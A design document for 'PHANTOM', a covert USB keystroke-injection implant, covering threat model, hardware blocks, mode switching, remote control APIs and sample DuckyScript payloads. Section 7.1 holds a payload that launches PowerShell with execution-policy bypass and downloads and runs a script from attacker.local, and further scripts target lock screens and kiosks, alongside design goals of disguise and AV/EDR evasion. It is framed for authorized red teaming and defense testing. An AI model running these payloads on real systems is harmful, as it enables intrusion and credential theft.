# PHANTOM — Phase 1: Conceptual Architecture

## 1. System Purpose

The **PHANTOM** (USB HID Emulation Payload Injector) is a compact, multi-profile USB HID attack platform targeting authorization bypass and credential harvesting through keyboard/mouse emulation. It enables security researchers and red teamers to:

- **Emulate USB HID devices**: Keyboard, mouse, and consumer control (media keys)
- **Execute DuckyScript payloads**: With precise timing, modifier keys, and extended commands
- **Store 100+ payload profiles**: On 16 MB SPI flash with on-device selection
- **Operate covertly**: Stealth mode (appears as mass storage) until payload is triggered
- **Control remotely**: Via WiFi (ESP32-C3) or BLE companion app
- **Geofence execution**: Restrict payloads to authorized network locations

The device operates as a USB-powered or battery-powered implant that can be carried during physical pentests or covertly deployed.

> **⚠️ Legal Notice:** This device is designed for authorized security research and penetration testing only. Unauthorized access to computer systems is illegal in most jurisdictions. Always obtain proper authorization.

## 2. Threat Model

### 2.1 Attack Targets (Authorized Pentest)

| Target OS | Attack Vector | Expected Outcome |
|-----------|--------------|-----------------|
| Windows 10/11 | HID keyboard injection | Privilege escalation, credential harvest, reverse shell |
| macOS | HID keyboard injection | Terminal access, Keychain extraction, MDM bypass |
| Linux (X11/Wayland) | HID keyboard/mouse | Terminal execution, privilege escalation |
| BIOS/UEFI | HID keyboard during POST | Boot order modification, Secure Boot bypass |
| Kiosk/ATM | HID keyboard + mouse | Application breakout, OS access |
| Locked workstation | HID consumer control | Screensaver bypass via media key injection |

### 2.2 Attack Surfaces (from target's perspective)

1. **USB Port Physical Access**: Attacker plugs device into an unsecured USB port
2. **HID Emulation**: Device enumerates as trusted input device (keyboard/mouse)
3. **Automated Execution**: Pre-programmed keystrokes execute without user interaction
4. **Driver-Level Trust**: OS trusts HID devices implicitly — no driver installation required
5. **Mass Storage Disguise**: Device can appear as a legitimate flash drive until activated
6. **Remote Trigger**: WiFi or BLE allows remote payload execution after physical deployment
7. **Geofenced Activation**: Payload only triggers at specific physical locations

### 2.3 Attack Scenarios

#### Scenario A: Physical Red Team
1. Operator carries PHANTOM into facility
2. Plugs into unlocked workstation USB port
3. Device enumerates as flash drive (stealth mode)
4. Operator uses rotary encoder to select payload
5. Press encoder button to switch to HID mode and execute
6. Payload completes, device returns to stealth or disconnects

#### Scenario B: Drop Box Deployment
1. PHANTOM is mailed/placed at target location
2. Target plugs device into computer (appears as flash drive)
3. After configurable delay, device switches to HID mode
4. Payload executes autonomously
5. Results exfiltrated via WiFi if available
6. Device returns to stealth mode after completion

#### Scenario C: Wireless Control
1. PHANTOM is pre-positioned at target (e.g., connected to always-on workstation)
2. Operator connects via BLE companion app from nearby
3. Operator selects payload, configures timing, triggers execution
4. Real-time status displayed on operator's phone
5. Multiple payloads can be queued and triggered sequentially

### 2.4 Defensive Countermeasures

This device also serves as a research tool for developing defenses:

| Defense | Effectiveness | Notes |
|---------|--------------|-------|
| USB port locks | High | Physical prevention |
| Whitelisting USB devices | High | Only approved VID/PID allowed |
| Group Policy: Disable USB HID | Medium | Can block unknown keyboards |
| Endpoint Detection & Response | Medium | Can detect rapid keystroke patterns |
| USB filtering hubs | High | Interposes between device and host |
| BIOS USB port disable | High | Prevents enumeration entirely |
| Behavioral monitoring | Low-Medium | Anomalous typing patterns |
| Keystroke encryption | High | Encrypts all HID input at driver level |

## 3. Performance Targets

| Parameter | Target | Measurement |
|-----------|--------|-------------|
| Typing speed | ≥ 500 characters/sec | USB HID 1 kHz poll rate |
| Keystroke latency | < 1 ms per key | Measured at USB bus level |
| Profile storage | ≥ 128 profiles | On 16 MB SPI flash |
| Profile switch time | < 500 ms | Including USB re-enumeration |
| Stealth→HID switch | < 2 seconds | Including USB re-enumeration |
| Boot to operational | < 800 ms | From power-on to HID ready |
| Battery life (standby) | ≥ 250 hours | OLED off, deep sleep |
| Battery life (active) | ≥ 8 hours | Continuous HID operation |
| WiFi range | ≥ 30 m | Open air, ESP32-C3 |
| BLE range | ≥ 15 m | Open air, ESP32-C3 |
| OLED refresh | 30 fps | Smooth menu scrolling |
| Geofence scan | < 5 seconds | WiFi scan for SSID match |
| Encryption overhead | < 100 ms per profile | AES-128 profile decryption |

## 4. Design Constraints

1. **USB-A stick form factor**: 50×25 mm PCB, must fit inside standard USB-A housing
2. **No external antenna**: ESP32-C3 PCB antenna must fit on board
3. **Battery optional**: Device must be fully functional without LiPo (USB-only mode)
4. **Kill switch mandatory**: Hardware switch must physically disconnect USB data lines
5. **Stealth by default**: Device always starts in MSC mode unless explicitly configured
6. **No wireless required**: All core functions must work without WiFi/BLE
7. **Open firmware**: All firmware is open-source for audit and modification
8. **DuckyScript compatible**: Must support standard DuckyScript 1.0 commands
9. **BOM under $20**: Target cost for 1K volume production

## 5. Block Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                            PHANTOM System Block                             │
│                                                                             │
│  ┌────────────────────────────────────────────────────────────────────┐    │
│  │                         RP2040 Dual-Core MCU                       │    │
│  │                                                                    │    │
│  │  ┌─────────────┐  ┌──────────────┐  ┌─────────────────────────┐  │    │
│  │  │ Core 0      │  │ Core 1       │  │ Peripherals              │  │    │
│  │  │ ┌─────────┐ │  │ ┌──────────┐ │  │ ┌──────┐ ┌──────┐      │  │    │
│  │  │ │ Payload  │ │  │ │ USB HID  │ │  │ │ SPI0 │ │ I²C0 │      │  │    │
│  │  │ │ Engine   │ │  │ │ Driver   │ │  │ │      │ │      │      │  │    │
│  │  │ │ + Parser │ │  │ │ + MSC   │ │  │ ├──────┤ ├──────┤      │  │    │
│  │  │ └─────────┘ │  │ └──────────┘ │  │ │ UART │ │ ADC  │      │  │    │
│  │  │ ┌─────────┐ │  │ ┌──────────┐ │  │ ├──────┤ ├──────┤      │  │    │
│  │  │ │ Profile  │ │  │ │ Display  │ │  │ │ PIO  │ │ SIO  │      │  │    │
│  │  │ │ Manager  │ │  │ │ Manager  │ │  │ │SM0-3 │ │GPIO  │      │  │    │
│  │  │ └─────────┘ │  │ └──────────┘ │  │ └──────┘ └──────┘      │  │    │
│  │  └─────────────┘  └──────────────┘  └─────────────────────────┘  │    │
│  │                                                                    │    │
│  │  ┌───────────────────────────────────────────────────────────┐    │    │
│  │  │ 264 KB SRAM  │  16 MB QSPI Boot Flash  │  USB FS CTL     │    │    │
│  │  └───────────────────────────────────────────────────────────┘    │    │
│  └────────────────────────────────────────────────────────────────────┘    │
│                                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐                     │
│  │ W25Q128JVSIQ │  │ ESP32-C3-    │  │ SSD1306      │                     │
│  │ 16MB SPI Flash│  │ MINI-1      │  │ 128×64 OLED  │                     │
│  │ (Payloads)   │  │ WiFi6+BLE5  │  │ (Display)    │                     │
│  │              │  │ (Control)   │  │              │                     │
│  │ SPI0 ←────── │  │ UART ←──────│  │ I²C ←─────── │                     │
│  └──────────────┘  └──────────────┘  └──────────────┘                     │
│                                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐                     │
│  │ EC11 Encoder │  │ Kill Switch  │  │ WS2812B LED  │                     │
│  │ (Navigation) │  │ (USB Data)   │  │ (Status)     │                     │
│  │              │  │              │  │              │                     │
│  │ GPIO ←────── │  │ GPIO ←────── │  │ GPIO ←────── │                     │
│  └──────────────┘  └──────────────┘  └──────────────┘                     │
│                                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐                     │
│  │ USB-A Plug   │  │ TS3USB221A   │  │ MCP73831     │                     │
│  │ (Host Conn)  │  │ (Data Switch)│  │ (LiPo Chgr)  │                     │
│  │              │  │              │  │              │                     │
│  │ USB ←─────── │  │ SW ←───────  │  │ VBUS ←────── │                     │
│  └──────────────┘  └──────────────┘  └──────────────┘                     │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 6. Data Flow

### 6.1 Payload Execution Flow

```
[OLED Display]
     │
     ▼
[Profile Selection] ──rotary encoder──► [Profile Manager]
     │                                          │
     │                                     ┌────┴────┐
     │                                     │ Decrypt │
     │                                     │ (AES)   │
     │                                     └────┬────┘
     │                                          │
     ▼                                          ▼
[DuckyScript Source] ─────────────► [Parser] ──► [Command Queue]
                                                   │
                                              ┌────┴────┐
                                              │ Validate │
                                              │ Geofence │
                                              └────┬────┘
                                                   │
                                           ┌───────┴───────┐
                                           │  Approved?     │
                                           └───┬───────┬───┘
                                          Yes   │       │  No
                                                ▼       ▼
                                        [HID Engine] [Block & Log]
                                                │
                                    ┌───────────┼───────────┐
                                    │           │           │
                                    ▼           ▼           ▼
                              [Keyboard]   [Mouse]   [Consumer]
                                    │           │           │
                                    └───────────┼───────────┘
                                                ▼
                                        [USB FS Device CTL]
                                                │
                                                ▼
                                          [Target Host]
```

### 6.2 USB Mode Switching Flow

```
[Stealth Mode (MSC)]
     │
     ├── Encoder press ──► [Switch to HID]
     ├── BLE command ─────► [Switch to HID]
     ├── WiFi trigger ────► [Switch to HID]
     ├── DuckyScript ────► [STEALTH_ON command]
     │
     ▼
[USB Bus Reset]
     │
     ▼
[HID Mode (Keyboard + Mouse + Consumer)]
     │
     ├── Payload complete ─► [STEALTH_OFF] ──► [Switch to MSC]
     ├── BLE command ────────► [Switch to MSC]
     ├── Kill switch OFF ────► [Disconnect USB data]
     │
     ▼
[USB Re-enumeration]
```

### 6.3 WiFi Control Flow

```
[Companion App] ───BLE───► [ESP32-C3] ───UART───► [RP2040]
     │                        │                       │
     │  ┌──── Commands ────┐  │                       │
     │  │ List profiles    │  │                       │
     │  │ Upload payload   │  │                       │
     │  │ Execute payload   │  │                       │
     │  │ Get status        │  │                       │
     │  │ Configure WiFi    │  │                       │
     │  │ Set geofence      │  │                       │
     │  └──────────────────┘  │                       │
     │                        │                       │
     │  ┌──── Responses ───┐  │                       │
     │  │ Profile list     │  │                       │
     │  │ Upload complete  │  │                       │
     │  │ Execution status │  │                       │
     │  │ WiFi scan results│  │                       │
     │  │ Battery level    │  │                       │
     │  └──────────────────┘  │                       │
     │                        │                       │
     │  ┌──── Events ───────┐  │                       │
     │  │ Payload started   │  │                       │
     │  │ Payload complete  │  │                       │
     │  │ Geofence block   │  │                       │
     │  │ Kill switch act.  │  │                       │
     │  └──────────────────┘  │                       │
```

## 7. Use Cases

### 7.1 Red Team: Credential Harvesting

```
DELAY 1000                    # Wait for driver installation
GUI r                          # Open Run dialog
DELAY 200
STRING powershell -ep bypass   # Launch PowerShell
DELAY 500
ENTER
DELAY 1000
STRING IEX(New-Object Net.WebClient).DownloadString('http://attacker.local/payload.ps1')
ENTER
STEALTH_OFF                    # Return to flash drive mode
```

### 7.2 Red Team: Lock Screen Bypass

```
DELAY 500
ENTER                          # Wake screen
DELAY 300
STRING <password>              # Known or guessed password
ENTER
DELAY 2000
# Now on desktop, execute second phase
PROFILE desktop_exploit
```

### 7.3 Physical Security: Kiosk Breakout

```
DELAY 1000
CTRL ALT DELETE               # Try to access Task Manager
DELAY 500
ALT F4                        # Close kiosk application
DELAY 300
WINDOWS D                     # Show desktop
DELAY 200
MOUSE_MOVE 500 300            # Navigate to Start
MOUSE_CLICK left              # Click
DELAY 200
STRING cmd                    # Open command prompt
```

### 7.4 Defensive Research: HID Attack Detection

PHANTOM can be used to test USB security policies:
- Verify USB device whitelisting effectiveness
- Test EDR detection of rapid keystroke injection
- Validate USB filtering hub behavior
- Measure detection latency for HID attack indicators
- Benchmark endpoint security against various payload techniques

### 7.5 Education: Security Awareness

- Demonstrate HID injection attacks in training environments
- Show how seemingly innocuous USB devices can compromise systems
- Train staff to recognize and report suspicious USB devices
- Develop and test organizational USB security policies

## 8. Risk Mitigations

| Risk | Mitigation |
|------|-----------|
| Unauthorized use | Hardware kill switch, encrypted payloads, geofencing |
| Detection by AV/EDR | Stealth mode, variable timing, randomized delays |
| Data exfiltration | No persistent network connection unless configured |
| Accidental execution | Requires explicit activation (encoder press, BLE command, or geofence) |
| Physical tampering | Encrypted payload storage, no debug port exposed |
| Firmware modification | Signed firmware updates, boot ROM verification |
| Loss/theft | Remote wipe via BLE, encrypted storage, kill switch |
| Legal liability | Prominent disclaimers, authorized-use-only license |

## 9. System States

```
                    ┌───────────────┐
                    │   POWER_ON    │
                    └───────┬───────┘
                            │
                    ┌───────▼───────┐
                    │  BOOT / INIT  │
                    │  Load profiles │
                    │  Read switches │
                    └───────┬───────┘
                            │
                    ┌───────▼───────┐
                    │ KILL_SWITCH?  │
                    └───┬───────┬───┘
                   YES  │       │ NO
                        │       │
                 ┌──────▼──┐   ┌▼─────────────┐
                 │  USB    │   │ STEALTH_MODE  │
                 │  POWER  │   │ (MSC device)  │
                 │  ONLY   │   │ OLED shows     │
                 │         │   │ profile list   │
                 └─────────┘   └───────┬───────┘
                                       │
                            ┌──────────┼──────────┐
                            │          │          │
                       Encoder    BLE/WiFi    Timer
                       Press      Command     Trigger
                            │          │          │
                            └──────────┼──────────┘
                                       │
                               ┌───────▼───────┐
                               │ GEOFENCE      │
                               │ CHECK         │
                               └───┬───────┬───┘
                                  OK│       │Blocked
                                    │       │
                          ┌─────────▼──┐  ┌─▼──────────┐
                          │ HID_MODE   │  │ BLOCK &    │
                          │ (Keyboard, │  │ LOG        │
                          │  Mouse,    │  │ Return to  │
                          │  Consumer) │  │ Stealth    │
                          └───────┬────┘  └────────────┘
                                  │
                          ┌───────▼──────┐
                          │ EXECUTE      │
                          │ PAYLOAD      │
                          └───────┬──────┘
                                  │
                          ┌───────▼──────┐
                          │ COMPLETE     │
                          │ Return to    │
                          │ Stealth or   │
                          │ Sleep        │
                          └──────────────┘
```

## 10. Interface Specifications

### 10.1 Rotary Encoder (EC11) Navigation

| Action | Function |
|--------|----------|
| Rotate CW | Scroll down profile list |
| Rotate CCW | Scroll up profile list |
| Single press | Select/execute highlighted profile |
| Long press (>2s) | Enter configuration menu |
| Double press | Cancel current operation |

### 10.2 OLED Display Layout (128×64)

```
┌────────────────────────────────┐
│ PHANTOM v1.0    [Battery] [WiFi]│  ← Status bar (16px)
├────────────────────────────────┤
│ ▶ Reverse Shell                │  ← Selected profile
│   Credential Harvest            │  ← Profile 2
│   Lock Screen Bypass           │  ← Profile 3
│   WiFi Scan                    │  ← Profile 4
│   Kiosk Breakout               │  ← Profile 5
├────────────────────────────────┤
│ [ENC] Select  [LONG] Config    │  ← Help bar (8px)
└────────────────────────────────┘
```

### 10.3 BLE Protocol

| Service | UUID | Characteristics |
|---------|------|-----------------|
| PHANTOM Control | 0xPH01 | Profile List, Execute, Status |
| PHANTOM Data | 0xPH02 | Upload Payload, Download Log |
| PHANTOM Config | 0xPH03 | WiFi Config, Geofence, Settings |
| Device Info | 0x180A | Firmware Version, Battery, Serial |

### 10.4 WiFi HTTP API

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/v1/profiles` | GET | List all profiles |
| `/api/v1/profiles/{id}` | GET | Get profile content |
| `/api/v1/profiles` | POST | Upload new profile |
| `/api/v1/profiles/{id}` | DELETE | Delete profile |
| `/api/v1/execute/{id}` | POST | Execute a profile |
| `/api/v1/status` | GET | Get execution status |
| `/api/v1/wifi/scan` | GET | Scan nearby networks |
| `/api/v1/config` | GET/PUT | Device configuration |
| `/api/v1/geofence` | GET/PUT | Geofence configuration |